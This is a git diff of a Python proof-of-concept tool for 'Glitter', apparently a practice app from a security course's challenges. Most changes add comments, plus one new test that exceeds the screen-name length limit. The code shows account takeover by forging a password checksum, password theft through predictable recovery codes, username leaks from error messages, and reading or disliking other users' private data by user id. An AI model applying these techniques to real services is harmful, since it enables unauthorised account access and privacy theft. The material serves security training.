@@ -57,15 +57,16 @@ def get_post_id():
 
     # get the user posts
     load = glitter.load_data_app(app_sock, temp_user_id, 5)
-    print(load)
 
     # simplify the response and print the posts
     glits = glitter.simplify_data(load)
 
+    # if there are no posts
     if glits is None:
         print("No glits found")
         return None
 
+    # line down and print the posts
     print()
     for i in range(len(glits)):
         print(str(i) + ". \"" + glits[i]['content'] + "\" (" + glits[i]['date'][0:10] + ")")
@@ -86,8 +87,12 @@ def show_search_result(search_result):
     # if the users was found let the user choose which user he wants to get his posts
     if search_result:
         print(str(len(search_result)) + " users found")
-        for i in range(len(search_result)):
-            print(str(i) + ". " + search_result[i]['screen_name'])
+        try:
+            for i in range(len(search_result)):
+                print(str(i) + ". " + search_result[i]['screen_name'] + " -- " + str(search_result[i]['id']) +
+                      " -- " + search_result[i]['mail'])
+        except Exception as e:
+            return
     else:
         print("No user found")
 
@@ -102,11 +107,16 @@ def create_glit_and_like_it(temp_sock, temp_user_id, temp_screen_name, temp_avat
     :param contect: the glit content
     :return: the like id
     """
+    # post a glit in the temp user
     msg = glitter.post_glit_app(temp_sock, temp_user_id, temp_user_id, temp_screen_name, temp_avatar, "white",
                                 glitter.get_current_time_post_format(), contect, "black")
     print("now let's like that glit")
+
+    # get the glit id and like it
     temp_glit_id = glitter.get_value_from_response(msg, "id")
     like_res = glitter.like_glit_app(temp_sock, temp_glit_id, temp_user_id, temp_screen_name)
+
+    # get the like id and return it
     temp_like_id = glitter.get_value_from_response(like_res, "id")
     return temp_like_id
 
@@ -117,11 +127,17 @@ def get_username_from_id(wanted_user_id):
     :param wanted_user_id: the user id
     :return: the username
     """
+    # get the user info
     res, status = glitter.change_user_info_app(app_sock, screen_name, avatar, description, privacy, wanted_user_id,
                                                username, password, gender, mail, False)
+
+    # make sure that the message was sent successfully but the user id is wrong
     if (status == glitter.FAILURE):
+        # get the username from the response
         wanted_username = res[res.find("username: ") + len("username: "):res.find("{")]
         return wanted_username
+
+    # if the user id is correct or an error occurred
     else:
         return None
 
@@ -210,7 +226,8 @@ def print_change_user_info_menu():
     print("Please choose one of the following options:")
     print("1. show username and password from server response")
     print("2. show username with user id")
-    print("3. exit")
+    print("3. update a user screen name that is longet then 20 characters")
+    print("4. exit")
 
 
 def print_challenges_menu():
@@ -222,9 +239,8 @@ def print_challenges_menu():
     print("1. the login challenge")
     print("2. the cookie challenge")
     print("3. the password challenge")
-    print("4. the XXS challenge")
-    print("5. the privacy challenge")
-    print("6. exit")
+    print("4. the privacy challenge")
+    print("5. exit")
 
 
 def print_right_menu(user_choice_kind):
@@ -275,6 +291,7 @@ def welcome_and_get_login_info():
     This function prints the welcome message and get the login info from the user
     :return: None
     """
+    # get the info from the user and assign it to the global variables
     global username, password
     print("Welcome to the prove of concept for glit")
     print("Before we start, please enter your username and password")
@@ -358,31 +375,41 @@ def dislike_glit_prove_of_concepts(user_choice):
         # This is a POC that show that you can dislike a private glit
         print("let's dislike a private glit by connecting to a different user that is private")
         try:
+            # try to login to a temp user
             temp_sock, temp_user_id, temp_screen_name, temp_avatar = login_to_temp_user()
         except Exception as e:
+            # if the login failed return to the main menu
             return
         print("now let's create a private glit")
+        # create a the glit and like it
         temp_like_id = create_glit_and_like_it(temp_sock, temp_user_id, temp_screen_name, temp_avatar,
                                                "this is a private glit")
         input("make sure that the post and the like are successful \npress enter to continue")
         print("now let's log out from the temp user")
+        # log out from the temp user
         glitter.logout_app(temp_sock, temp_user_id)
         print("now let's dislike the private glit from the main user")
+        # dislike the glit
         glitter.dislike_glit_app(app_sock, temp_like_id)
 
     elif (user_choice == "2"):
         # This is a POC that show that you can dislike a glit that is not yours
         print("let's dislike a glit that is not ours by connecting to a different user")
         try:
+            # try to login to a temp user
             temp_sock, temp_user_id, temp_screen_name, temp_avatar = login_to_temp_user()
         except Exception as e:
+            # if the login failed return to the main menu
             return
         print("now let's create a glit")
+        # create a the glit and like it
         temp_like_id = create_glit_and_like_it(temp_sock, temp_user_id, temp_screen_name, temp_avatar, "this is a glit")
         input("make sure that the post and the like are successful \npress enter to continue")
         print("now let's log out from the temp user")
+        # log out from the temp user
         glitter.logout_app(temp_sock, temp_user_id)
         print("now let's dislike the glit from the main user")
+        # dislike the glit
         glitter.dislike_glit_app(app_sock, temp_like_id)
     elif (user_choice == "3"):
         return
@@ -466,6 +493,15 @@ def change_user_info_prove_of_concepts(user_choice):
         print("the username of the user is: " + wanted_username)
 
     elif (user_choice == "3"):
+        # This is a POC that show that you can send a request to change the user info with a user screen name that is
+        # longer than the 20 characters max
+        if (input("this will change your user screen name are you sure? (y/n): ") == "y"):
+            res, status = glitter.change_user_info_app(app_sock, "this screen name is bigger then the max screen name",
+                                                       avatar, description, privacy, user_id, username,
+                                                       password, gender, mail)
+            if (status == glitter.SUCCESS):
+                print("your screen name was changed to: " + glitter.get_value_from_response(res, "screen_name"))
+    elif (user_choice == "4"):
         return
 
 
@@ -505,7 +541,7 @@ def login_challenge():
     by subtracting the checksum of the username from the checksum of the password and the username combined
     we get the checksum of the password, then we can create a string with the ascii sum of the checksum of the password,
     and then we are in the account without knowing the password
-    by combining this falty with the change user info POC we can get the username with the user id
+    by combining this faulty with the change user info POC we can get the username with the user id
     witch we can get with the search
     :return: None
     """
@@ -615,14 +651,22 @@ def password_challenge():
     the userid, and then we can reveal the password abd get it
     :return: None
     """
+    # get the user id of the user to send the recovery email to
     wanted_user_id = get_user_id()
     if wanted_user_id is None:
         return
     password_username = get_username_from_id(wanted_user_id)
+
+    # send the recovery email to the user and save the sent status
     mail_sent = glitter.request_password_recovery_web(password_username)
+
+    # if the mail was sent generate the recovery code and print the password
     if mail_sent:
         print("the mail was sent to the user")
+        # generate the recovery code
         recovery_code = glitter.generate_key(glitter.get_current_date(), wanted_user_id, glitter.get_current_time())
+
+        # print the recovery code and the password
         print("the recovery code is: " + recovery_code)
         print("the password is: " + glitter.get_password_from_recovery_code(password_username, recovery_code))
 
@@ -630,7 +674,11 @@ def password_challenge():
 def privacy_challenge():
     """
     this function run the privacy challenge
-
+    the privacy challenge is to get the private information of a user that only the user can see
+    it works because glitter have commends that should ley you see history information of a user and glance requests
+    but those commends are not checking if the user is the user that the information is about
+    but only require the user id of the user that the information is about, so we can use these faulty to gain access to
+    the private information of the user
     :return:
     """
     # ask the user if he wants to see the user search history or the user glance requests
@@ -690,7 +738,6 @@ def privacy_challenge():
         # if there is no glance requests print that there is no glance requests
         print("the user didn't get any glance requests")
         return
-
 
 
 def main():
